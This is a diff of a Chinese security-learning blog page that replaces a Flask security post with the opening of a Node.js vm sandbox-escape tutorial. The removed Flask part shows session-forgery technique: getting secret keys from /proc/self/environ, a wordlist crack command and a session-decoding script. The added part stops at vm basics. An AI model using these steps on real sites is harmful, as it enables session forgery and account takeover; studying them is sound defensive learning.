@@ -19,24 +19,36 @@
   <meta name="author" content="sangnigege">
   <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
   
-    <meta name="description" content="jinja2模板注入详见： SSTI-Lab全详解 - 重庆森林不在重庆 session伪造session由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要求必须实现有状态，而session机制实现的就是这个功能。 用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，">
+    <meta name="description" content="前言前置知识沙箱与沙箱逃逸什么是沙箱（sandbox）？ 当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。 沙箱（sandbox）和 虚拟">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Flask安全问题">
+<meta property="og:title" content="node vm沙箱逃逸学习总结">
 <meta property="og:url" content="http://example.com/2025/test31/index.html">
 <meta property="og:site_name" content="重庆森林不在重庆">
-<meta property="og:description" content="jinja2模板注入详见： SSTI-Lab全详解 - 重庆森林不在重庆 session伪造session由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要求必须实现有状态，而session机制实现的就是这个功能。 用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，">
+<meta property="og:description" content="前言前置知识沙箱与沙箱逃逸什么是沙箱（sandbox）？ 当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。 沙箱（sandbox）和 虚拟">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132245953.png">
-<meta property="article:published_time" content="2025-07-13T14:31:00.000Z">
-<meta property="article:modified_time" content="2026-03-31T07:07:28.759Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248275.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248127.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248143.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248147.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248910.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248734.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248414.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248406.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248223.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248856.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248177.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132249391.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132249954.png">
+<meta property="article:published_time" content="2025-07-13T14:32:00.000Z">
+<meta property="article:modified_time" content="2026-04-15T11:35:34.098Z">
 <meta property="article:author" content="sangnigege">
 <meta property="article:tag" content="学习总结">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132245953.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248275.png">
   
   
   
-  <title>Flask安全问题 - 重庆森林不在重庆</title>
+  <title>node vm沙箱逃逸学习总结 - 重庆森林不在重庆</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -227,7 +239,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Flask安全问题"></span>
+            <span id="subtitle" data-typed-text="node vm沙箱逃逸学习总结"></span>
           
         </div>
 
@@ -238,7 +250,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-07-13 22:31" pubdate>
+        <time datetime="2025-07-13 22:32" pubdate>
           2025年7月13日 晚上
         </time>
       </span>
@@ -250,7 +262,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          7.1k 字
         
       </span>
     
@@ -261,7 +273,7 @@
         
         
         
-          14 分钟
+          60 分钟
         
       </span>
     
@@ -307,111 +319,274 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Flask安全问题</h1>
+            <h1 id="seo-header">node vm沙箱逃逸学习总结</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="jinja2模板注入"><a href="#jinja2模板注入" class="headerlink" title="jinja2模板注入"></a>jinja2模板注入</h1><p>详见：</p>
-<p><a target="_blank" rel="noopener" href="https://sangnigege.github.io/2025/07/13/25SSTI-Lab%E5%85%A8%E8%AF%A6%E8%A7%A3/">SSTI-Lab全详解 - 重庆森林不在重庆</a></p>
-<h1 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h1><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要求必须实现有状态，而session机制实现的就是这个功能。</p>
-<p>用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，它保存了正在使用的所有用户的状态信息；这段状态信息分配了一个唯一的标识符用来标识用户的身份，将其保存在响应对象的cookie中；当第二次请求时，解析cookie中的标识符，拿到标识符后去session找到对应的用户的信息。</p>
-<p>其实作者在《HTTP原理及具体细节》一文中讲了session，这里就不具体展开了</p>
-<h2 id="flask-session"><a href="#flask-session" class="headerlink" title="flask session"></a>flask session</h2><p><strong>储存方式</strong></p>
-<p>第一种方式：直接存在客户端的cookies中</p>
-<p>第二种方式：存储在服务端，如：redis,memcached,mysql，file,mongodb等等，存在flask-session第三方库</p>
-<p>flask的session可以保存在客户端的cookie中，那么就会产生一定的安全问题。</p>
-<p><strong>flask session格式</strong></p>
-<p>flask的session格式一般是由<code>base64加密的Session数据(经过了json、zlib压缩处理的字符串) </code> .  <code>时间戳</code>  .  <code>签名</code>组成的。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48ncA.H99Th2w4FzzphEX8qAeiSPuUF_0<br>               session数据                     . 时间戳.         签名               <br></code></pre></td></tr></table></figure>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="沙箱与沙箱逃逸"><a href="#沙箱与沙箱逃逸" class="headerlink" title="沙箱与沙箱逃逸"></a>沙箱与沙箱逃逸</h2><p><strong>什么是沙箱（sandbox）？</strong></p>
+<p>当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</p>
+<p><strong>沙箱（sandbox）和 虚拟机（VM）和 容器（Docker）之间的区别：</strong></p>
+<p>sandbox和VM使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。Docker属于sandbox的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用Docker和sandbox嵌套的方式更多一点，安全性也更高。</p>
+<p><strong>常见沙箱逃逸都有啥？</strong></p>
+<p>浏览器沙箱逃逸：利用浏览器中的漏洞（如V8&#x2F;JSC内存漏洞、UAF、类型混淆等）获得沙箱进程权限，进一步利用提权漏洞逃逸到宿主系统。</p>
+<p>虚拟机和容器沙箱逃逸：虚拟机逃逸，利用虚拟化软件（如VMware、VirtualBox、QEMU等）漏洞，从虚拟机突破到宿主机系统；容器逃逸，利用容器（如Docker、LXC等）漏洞突破容器边界，访问宿主机资源。</p>
+<p>语言解释器沙箱逃逸：Node.js沙箱逃逸，利用<code>vm</code>模块、Function构造器等机制绕过沙箱，访问<code>process</code>、<code>require</code>等敏感对象，执行系统命令；Python沙箱逃逸，利用<code>exec</code>、<code>eval</code>、<code>__import__</code>等内置函数或对象反射实现突破，访问文件或系统命令。</p>
+<p>移动端沙箱逃逸：iOS越狱&#x2F;Android提权，利用内核漏洞或安全机制缺陷突破应用沙箱，获得系统权限。</p>
+<p>云环境沙箱逃逸：云函数&#x2F;FaaS沙箱隔离绕过，针对云平台多租户环境的隔离缺陷，实现跨租户攻击。</p>
+<p>这里我们主要讲解语言解释器沙箱逃逸。</p>
+<p><strong>语言解释器沙箱的作用：</strong></p>
+<p>语言解释器沙箱的主要作用是安全隔离和受控执行，常用于在线编程平台、云函数、插件扩展、教育实验等需要运行不可信代码的场景。</p>
+<h1 id="Node-js沙箱逃逸"><a href="#Node-js沙箱逃逸" class="headerlink" title="Node.js沙箱逃逸"></a>Node.js沙箱逃逸</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="vm模块"><a href="#vm模块" class="headerlink" title="vm模块"></a><strong>vm模块</strong></h3><p><strong>node.js是啥？</strong></p>
+<p>JavaScript本来用在浏览器前端，后来将Chrome中的v8引擎单独拿出来为JavaScript单独开发了一个运行环境，因此JavaScript也可以作为一门后端语言。</p>
+<p>所以Node.js是一个基于 Chrome V8 引擎的<strong>JavaScript 运行环境</strong>，允许开发者在服务器端运行 JavaScript 代码。</p>
+<p><strong>什么是vm模块？</strong></p>
+<p>vm模块是node.js内置的一个模块，理论上不能叫做沙箱，它只是Node.js提供给使用者的一个隔离环境</p>
+<p>在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。</p>
+<p><strong>vm模块的作用</strong></p>
+<p>vm模块就是实现一个沙箱，然后我们往沙箱里传入代码，可以执行代码返回结果，同时不会对沙箱外面产生影响。</p>
+<p>这里我们可以总结出vm实现的两个要点：</p>
+<ol>
+<li>传入字符串并将其作为代码执行，得到结果</li>
+<li>不会对外面造成影响，如同函数一般，将其限制在作用域内，只要最后的运行结果</li>
+</ol>
+<p>我们这里用代码理解上面两点</p>
+<p>我们现在当前目录创建age.txt，写入</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>
 
-<p>时间戳：用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；</p>
-<p>签名：是利用<code>Hmac</code>算法，将session数据和时间戳加上<code>secret_key</code>加密而成的，用来保证数据没有被修改。</p>
-<h2 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask session伪造"></a>flask session伪造</h2><p>上面我们说到flask session是利用hmac算法将session数据，时间戳加上secert_key成的，那么我们要进行session伪造就要先得到secret_key，当我们得到secret_key我们就可以很轻松的进行session伪造。</p>
-<p><strong>secret_key怎么获得？</strong></p>
-<p>secret_key有可能可以直接在源代码里找到（如果给了的话），比如在config.py里面发现密钥；</p>
-<p>也有可能在环境变量里找到，比如<code>/proc/self/environ</code>或者<code>/proc/1/environ</code>；</p>
-<p>也有可能在内存中获取，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qqww22884455/article/details/148213487">Flask Session 伪造全流程解析：从内存窃取到会话劫持_flask session伪造-CSDN博客</a>；</p>
-<p>若<code>SECRET_KEY</code>较弱（如短字符串或常见密码），工具可尝试暴力破解（该工具下面会介绍）；</p>
-<p>命令格式：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python flask_session_cookie_manager3.py crack -c &lt;SESSION_COOKIE&gt; -w &lt;WORDLIST_PATH&gt;<br></code></pre></td></tr></table></figure>
+<p>然后创建demo.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;age.txt&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)<br><span class="hljs-built_in">eval</span>(content)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<br></code></pre></td></tr></table></figure>
 
-<p>当然，也有可能结合其他漏洞获得secret_key，或者给定了一个可破解的密钥生成算法（根据源代码）。</p>
-<p><strong>获得secret_key怎么伪造呢？</strong></p>
-<p>session伪造其实主要是利用工具或者脚本。</p>
-<p>工具：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">GitHub - noraj&#x2F;flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder&#x2F;Encoder</a></p>
-<p>工具的使用方法可以自己查阅，使用该工具就完全可以做到session伪造</p>
-<p>脚本（原作者是phith0n）：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decryption</span>(<span class="hljs-params">payload</span>):<br>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br>    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br><br>    decompress = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):<br>        payload = payload[<span class="hljs-number">1</span>:]<br>        decompress = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">try</span>:<br>        payload = base64_decode(payload)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span><br>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> decompress:<br>        <span class="hljs-keyword">try</span>:<br>            payload = zlib.decompress(payload)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span><br>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))<br></code></pre></td></tr></table></figure>
+<p>不难发现，成功将txt中的字符串作为代码执行并输出18。</p>
+<p>这就是作用里的第一点</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248275.png" srcset="/img/loading.gif" lazyload alt="image-20250705230950075"></p>
+<p>但是如果当前作用域下有相同变量名，会发生什么</p>
+<p>我们修改代码如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;age.txt&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-keyword">let</span> age= <span class="hljs-number">20</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)<br><span class="hljs-built_in">eval</span>(content)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<br></code></pre></td></tr></table></figure>
 
-<p>该脚本用于解密，使用方法</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">命令：<br>python Decrypt_session_phith0n.py .eJxNUE2LgzAQ_SvLnD2otZdCDy5RcSHJWiIyuYjtWjWaLtiWxpT<span class="hljs-punctuation">-</span><span class="hljs-number">9027</span>sOxhmMP7mjd3qI9ze<span class="hljs-punctuation">-</span><span class="hljs-number">5</span>hc5mvrQf18AWbO7ztYQOopaKkW1OBAa<span class="hljs-punctuation">-</span>ShYZ4wyr3ORkXFhY3Sd57XqUTF6VBu<span class="hljs-punctuation">-</span>upSiJmy5WsPpwysUwnIdU7hSIOmS0sFV2A2vE0NfzJIU5L0gHVuOIVXaNNFkYOPgvzwGndLkIU7oaqjFiWTmi7lczKQGZoOMkXqWLrvCM3W3h4cDjPx_ryPbanfxUSw7Lcp6RXaHsXXVipDhG1nXHxiup0dDUnJnJDn9FZvvB4<span class="hljs-punctuation">-</span><span class="hljs-number">7</span>IbdNO1f06CTJ<span class="hljs-punctuation">-</span>y<span class="hljs-punctuation">-</span>EVOjXYA6OYyDwY8uJ7b<span class="hljs-punctuation">-</span>fU4CHx4_ABsUm1d.Z7iVHg.OyTfaVtPY8mLno<span class="hljs-punctuation">-</span>nCvMBfcnai0k<br><br>结果：<br>&#123;&#x27;_fresh&#x27;<span class="hljs-punctuation">:</span> True<span class="hljs-punctuation">,</span> &#x27;_id&#x27;<span class="hljs-punctuation">:</span> b&#x27;bfc<span class="hljs-number">089165</span>9a23f0ab<span class="hljs-number">4892</span>7d0d0a9ae951c4a<span class="hljs-number">218757</span>ebff136a62dca<span class="hljs-number">06743185</span>bda2c19bfd1e81bb979c9c<span class="hljs-number">124747</span>b56a47d6a6c1e84aec87de5df<span class="hljs-number">1822</span>f03a08a0&#x27;<span class="hljs-punctuation">,</span> &#x27;csrf_token&#x27;<span class="hljs-punctuation">:</span> b&#x27;ba14b408cc8a2d3f<span class="hljs-number">7838</span>1d1c2adbfe<span class="hljs-number">521074</span>4b28&#x27;<span class="hljs-punctuation">,</span> &#x27;image&#x27;<span class="hljs-punctuation">:</span> b&#x27;L9Oe&#x27;<span class="hljs-punctuation">,</span> &#x27;name&#x27;<span class="hljs-punctuation">:</span> &#x27;matrix&#x27;<span class="hljs-punctuation">,</span> &#x27;user_id&#x27;<span class="hljs-punctuation">:</span> &#x27;10&#x27;&#125;<br></code></pre></td></tr></table></figure>
+<p>结果是出现报错</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248127.png" srcset="/img/loading.gif" lazyload alt="image-20250705230923271"></p>
+<p>在js中每一个模块都有自己独立的作用域，所以用eval执行字符串代码很容易出现上面的这个问题。</p>
+<p>上述提到的方法由于不同模块作用域被限制了使用，那么我们是否可以自己创造作用域呢？</p>
+<p>我们可以用new Function做到，new Function的第一个参数是形参名称，第二个参数是函数体。</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">let age= <span class="hljs-number">20</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">add</span> = <span class="hljs-keyword">new</span> <span class="hljs-keyword">Function</span><span class="hljs-params">(<span class="hljs-string">&#x27;age&#x27;</span>,<span class="hljs-string">&#x27;return age+1&#x27;</span>)</span><br><span class="hljs-title function_">console</span>.<span class="hljs-title function_">log</span><span class="hljs-params">(<span class="hljs-keyword">add</span>(age)</span>)<br><span class="hljs-title function_">console</span>.<span class="hljs-title function_">log</span><span class="hljs-params">(age)</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248143.png" srcset="/img/loading.gif" lazyload alt="image-20250705230833913"></p>
+<p>我们都知道函数内和函数外是两个作用域。</p>
+<p>当在函数中的作用域想要使用函数外的变量时，要通过形参来传递，然后返回结果，而这个过程并不会影响函数外的变量。</p>
+<p>这就是作用里的第二点。</p>
+<p>但是当参数过多时这种方法就变的麻烦起来了，并不实用。</p>
+<p>从上面两个执行代码的例子可以看出来vm模块的实际作用：创建一个能够通过传一个字符串就能执行代码，并且还与外部隔绝的作用域。</p>
+<h3 id="Nodejs作用域"><a href="#Nodejs作用域" class="headerlink" title="Nodejs作用域"></a><strong>Nodejs作用域</strong></h3><p>说到作用域，我们就要了解一下Node中的作用域是怎么分配的（在Node中一般把作用域叫上下文）</p>
+<p>我们在写一个Node项目时往往要在一个文件里ruquire其他的js文件，这些文件我们都给它们叫做“包”。每一个包都有一个自己的上下文，包之间的作用域是互相隔离不互通的，也就是说就算我在1.js中require了2.js，那么我在1.js中也无法直接调用2.js中的变量和函数。</p>
+<p>举个例子</p>
+<p>在同一级目录下，有1.js和2.js两个文件</p>
+<p>1.js</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>
+
+<p>2.js</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">const <span class="hljs-keyword">a</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./1&quot;</span>)<br>console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">a</span>.age)<br></code></pre></td></tr></table></figure>
+
+<p>可以发现是undefined</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248147.png" srcset="/img/loading.gif" lazyload alt="image-20250705230800331"></p>
+<p>那么我们想2.js中引入并使用y1中的元素应该怎么办呢，Node给我们提供了一个将js文件中元素输出的接口<code>exports</code> ，把1.js修改成下面这样：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">20</span><br>exports.age <span class="hljs-operator">=</span> age<br></code></pre></td></tr></table></figure>
+
+<p>我们再运行y2就可以拿到age的值了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248910.png" srcset="/img/loading.gif" lazyload alt="image-20250705231543059"></p>
+<p>我们用图来解释这两个包之间的关系就是</p>
+<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248734.png" srcset="/img/loading.gif" lazyload alt="img" style="zoom:50%;" />
+
+<p>这个时候就有人会问左上角的global是什么？这里就要说到Node.js中的全局对象了。</p>
+<p>刚才我们提到在JavaScript中<code>window</code>是全局对象，浏览器其他所有的属性都挂载在<code>window</code>下，</p>
+<p>但是Node.js 没有 window 对象，那么在服务端的Nodejs中和<code>window</code>类似的全局对象叫做<code>global</code>。在 Node.js 中，最顶层的全局对象是 global，Nodejs下其他的所有属性和包都挂载在这个global对象下。</p>
+<p>在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用<code>global.xxx</code>的方式来访问，直接用<code>xxx</code>就可以调用这个变量。举个例子，<code>console</code>就是挂载在global下的一个全局变量，我们在用<code>console.log</code>输出时并不需要写成<code>global.console.log</code>，其他常见全局变量还有process（一会逃逸要用到）。</p>
+<p>我们也可以手动声明一个全局变量，但全局变量在每个包中都是共享的，所以尽量不要声明全局变量，不然容易导致变量污染。用上面的代码举个例子：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.js</span><br>global<span class="hljs-selector-class">.age</span> = <span class="hljs-number">20</span><br><br><br><span class="hljs-number">2</span><span class="hljs-selector-class">.js</span><br>const <span class="hljs-selector-tag">a</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./y1&quot;</span>)<br>console<span class="hljs-selector-class">.log</span>(age)<br></code></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132248414.png" srcset="/img/loading.gif" lazyload alt="image-20250705231543059"></p>
+<p>可以发现我这次在1.js中并没有使用<code>exports</code>将age导入，并且2.js在输出时也没有用<code>a.age</code>，因为此时age已经挂载在global上了，它的作用域已经不在1.js中了。</p>
+<h3 id="vm沙箱"><a href="#vm沙箱" class="headerlink" title="vm沙箱"></a>vm沙箱</h3><p><strong>vm模块的常用API</strong></p>
+<p>我们在前面提到了作用域这个概念，所以我们现在思考一下，如果想要实现沙箱的隔离作用，我们是不是可以创建一个新的作用域，让代码在这个新的作用域里面去运行，这样就和其他的作用域进行了隔离，这也就是vm模块运行的原理，先来了解几个常用的vm模块的API。</p>
+<ol>
+<li><code>vm.createContext([sandbox][, options])</code></li>
+</ol>
+<p>在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</p>
+<p>例：<code>const context = vm.createContext(&#123; a: 1 &#125;)</code></p>
+<ol start="2">
+<li><code>vm.runInContext(code, context[, options])</code></li>
+</ol>
+<p>参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</p>
+<p>例：<code>vm.runInContext(&#39;a = a + 1&#39;, context)</code></p>
+<p>我们用代码演示一下上面两个api</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;util&#x27;</span>);<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span> = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">const</span> sandbox = &#123; <span class="hljs-attr">globalVar</span>: <span class="hljs-number">1</span> &#125;;<br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">&#x27;globalVar *= 2;&#x27;</span>, sandbox);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox)); <span class="hljs-comment">// &#123; 